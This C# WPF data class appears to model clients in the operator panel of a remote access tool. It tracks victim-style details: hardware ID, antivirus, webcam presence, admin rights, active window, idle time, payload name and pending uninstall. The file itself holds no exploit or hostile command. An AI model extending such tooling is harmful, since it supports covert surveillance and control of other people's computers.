using System.ComponentModel;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using SeroServer.UI;

namespace SeroServer.Data;

public class ConnectedClient : INotifyPropertyChanged
{
    public event PropertyChangedEventHandler? PropertyChanged;
    private void Notify([CallerMemberName] string? p = null)
        => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(p));

    public string Id { get; set; } = Guid.NewGuid().ToString("N")[..8];
    public int Port { get; set; }
    public string Hwid { get; set; } = string.Empty;
    public string InstanceId { get; set; } = string.Empty;
    public string Username { get; set; } = string.Empty;
    public string IP { get; set; } = string.Empty;
    public string MachineName { get; set; } = string.Empty;
    public string Payload { get; set; } = string.Empty;
    public string Antivirus { get; set; } = string.Empty;
    public string Country { get; set; } = "...";
    public string CountryCode { get; set; } = "";
    public string CountryDisplay => string.IsNullOrEmpty(CountryCode) ? Country : $"[{CountryCode.ToUpper()}] {Country}";

    private BitmapImage? _flagImage;
    public BitmapImage? FlagImage
    {
        get => _flagImage;
        set { if (!ReferenceEquals(_flagImage, value)) { _flagImage = value; Notify(); } }
    }
    public DateTime FirstSeen { get; set; } = DateTime.UtcNow;
    public DateTime ConnectedAt { get; set; } = DateTime.UtcNow;
    public DateTime LastHeartbeat { get; set; } = DateTime.UtcNow;
    public DateTime PingSentAt { get; set; }
    public SslStream? Stream { get; set; }
    public SemaphoreSlim WriteLock { get; } = new(1, 1);
    public CancellationTokenSource Cts { get; set; } = new();
    public bool PendingUninstall { get; set; }
    // 3s heartbeat interval; 45s window tolerates congested VM connections where
    // heartbeats can be delayed by large RDP/webcam frames backing up the TLS write lock,
    // as well as brief network interruptions, NAT timeouts, and ISP micro-outages.
    public bool IsAlive => (DateTime.UtcNow - LastHeartbeat).TotalSeconds < 45;

    private int _idleSeconds;
    public int IdleSeconds
    {
        get => _idleSeconds;
        set { if (_idleSeconds != value) { _idleSeconds = value; Notify(); Notify(nameof(StatusColor)); Notify(nameof(StatusTooltip)); Notify(nameof(StatusText)); } }
    }
    // "Green" = active (< 5 min idle), "Yellow" = idle (5–15 min), "Grey" = AFK (> 15 min)
    public string StatusColor   => _idleSeconds <= 0 ? "Green" : _idleSeconds < 300 ? "Green" : _idleSeconds < 900 ? "Yellow" : "Grey";
    public string StatusText    => StatusColor == "Yellow" ? Lang.Get("STATUS_IDLE") : StatusColor == "Grey" ? Lang.Get("STATUS_AFK") : Lang.Get("STATUS_ACTIVE");
    public string StatusTooltip => _idleSeconds <= 0 ? "Active" : _idleSeconds < 300 ? $"Active ({_idleSeconds}s)" : _idleSeconds < 900 ? $"Idle ({_idleSeconds / 60}m)" : $"AFK ({_idleSeconds / 60}m)";
    public void   NotifyStatus() => Notify(nameof(StatusText));

    private int _activeSessions;
    public int ActiveSessions
    {
        get => _activeSessions;
        set { if (_activeSessions != value) { _activeSessions = value; Notify(); Notify(nameof(IsOperatorBusy)); } }
    }
    public bool IsOperatorBusy => _activeSessions > 0;

    private string _os = string.Empty;
    public string OS { get => _os; set { if (_os != value) { _os = value; Notify(); } } }

    private bool _isAdmin;
    public bool IsAdmin { get => _isAdmin; set { if (_isAdmin != value) { _isAdmin = value; Notify(); Notify(nameof(Privilege)); } } }
    public string Privilege => _isAdmin ? "Admin" : "User";

    private string _tag = string.Empty;
    public string Tag    { get => _tag; set { if (_tag != value) { _tag = value; Notify(); Notify(nameof(HasTag)); } } }
    public bool   HasTag => !string.IsNullOrEmpty(_tag);

    private string _activeWindow = string.Empty;
    public string ActiveWindow
    {
        get => _activeWindow;
        set { if (_activeWindow != value) { _activeWindow = value; Notify(); } }
    }

    private string _cameraStatus = "?";
    public string CameraStatus
    {
        get => _cameraStatus;
        set { if (_cameraStatus != value) { _cameraStatus = value; Notify(); Notify(nameof(CameraIcon)); } }
    }
    public string CameraIcon => _cameraStatus.Equals("Yes", StringComparison.OrdinalIgnoreCase) ? "📷" :
                                _cameraStatus.Equals("No",  StringComparison.OrdinalIgnoreCase) ? "—"  : "?";

    private float _cpuUsage;
    public float CpuUsage
    {
        get => _cpuUsage;
        set { if (_cpuUsage != value) { _cpuUsage = value; Notify(); Notify(nameof(CpuBrush)); } }
    }
    public Brush CpuBrush => _cpuUsage < 40 ? _brushGreen : _cpuUsage < 75 ? _brushYellow : _brushRed;

    private string _cpuName = string.Empty;
    public string CpuName { get => _cpuName; set { if (_cpuName != value) { _cpuName = value; Notify(); Notify(nameof(CpuDisplay)); } } }
    public string CpuDisplay => string.IsNullOrEmpty(_cpuName) ? "—" : _cpuName;
    public string CpuLoadDisplay => _cpuUsage > 0 ? $"{_cpuUsage:0}%" : "—";

    private string _gpuName = string.Empty;
    public string GpuName { get => _gpuName; set { if (_gpuName != value) { _gpuName = value; Notify(); } } }
    public string GpuDisplay => string.IsNullOrEmpty(_gpuName) ? "—" : _gpuName;

    private long _ramUsed;
    private long _ramTotal;
    public long RamUsed  { get => _ramUsed;  set { if (_ramUsed  != value) { _ramUsed  = value; Notify(); Notify(nameof(RamDisplay)); } } }
    public long RamTotal { get => _ramTotal; set { if (_ramTotal != value) { _ramTotal = value; Notify(); Notify(nameof(RamDisplay)); } } }
    public string RamDisplay => _ramTotal > 0
        ? $"{(int)Math.Round(_ramUsed / 1024.0)} / {StdGb(_ramTotal)} GB"
        : "—";
    private static string ToGb(long mb) => (mb / 1024.0).ToString("0.#");
    private static int StdGb(long mb) { int g = (int)Math.Ceiling(mb / 1024.0); int s = 4; while (s < g) s *= 2; return s; }

    private int _pingMs = -1;
    public int PingMs
    {
        get => _pingMs;
        set
        {
            if (_pingMs != value)
            {
                _pingMs = value;
                Notify();
                Notify(nameof(PingDisplay));
                Notify(nameof(PingBrush));
            }
        }
    }
    public string PingDisplay => _pingMs < 0 ? "..." : $"{_pingMs} ms";

    // Green < 80ms · Yellow 80-200ms · Red > 200ms · Dim while waiting
    private static readonly Brush _brushDim    = new SolidColorBrush(Color.FromRgb(0x7a, 0x86, 0xb5));
    private static readonly Brush _brushGreen  = new SolidColorBrush(Color.FromRgb(0x35, 0xf8, 0x9c));
    private static readonly Brush _brushYellow = new SolidColorBrush(Color.FromRgb(0xff, 0xd2, 0x3f));
    private static readonly Brush _brushRed    = new SolidColorBrush(Color.FromRgb(0xff, 0x38, 0x60));
    public Brush PingBrush => _pingMs < 0 ? _brushDim
        : _pingMs < 80  ? _brushGreen
        : _pingMs < 200 ? _brushYellow
        : _brushRed;
}
